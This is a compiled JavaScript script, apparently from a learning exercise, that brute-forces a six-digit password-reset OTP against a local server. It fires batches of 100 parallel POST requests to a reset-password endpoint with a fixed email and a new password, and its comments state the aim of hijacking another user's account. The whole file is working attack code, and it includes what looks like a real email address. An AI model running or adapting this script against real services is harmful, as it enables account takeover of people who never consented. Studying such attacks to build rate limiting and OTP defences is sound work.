"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
//from this server we will try to hijack the session of another user
//that is when the otp is generated
//we can do something like send request for random otps until the otp is true
//first we go to postman and hit the route to behijacked then we take the nodejs axios code from it  
function sendRequest(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = JSON.stringify({
            "email": "dassrinjoy333@gmail.com",
            "otp": otp,
            "newPassword": "123123"
        });
        let config = {
            method: 'post',
            maxBodyLength: Infinity,
            url: 'http://localhost:3000/reset-password',
            headers: {
                'Content-Type': 'application/json'
            },
            data: data
        };
        try {
            yield axios_1.default.request(config);
        }
        catch (error) {
            //console.log(error);
        }
    });
}
//batching --> 100 at a time request will go --> 100 requests complete then the 100 will go , what it helps is the memory stack will not run out of memory
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 0; i <= 999999; i = i + 100) { //fist i requests will go out 
            const p = [];
            console.log(i);
            for (let j = 0; j < 100; j++) {
                //console.log(i+j);
                //sneding the 100 requests
                p.push(sendRequest((i + j).toString())); //we are putting the async requests to a array p
            }
            yield Promise.all(p); //so we are telling the requests to go parallely and when all succeds then we will continue to the next 100 batch
        }
    });
}
main();
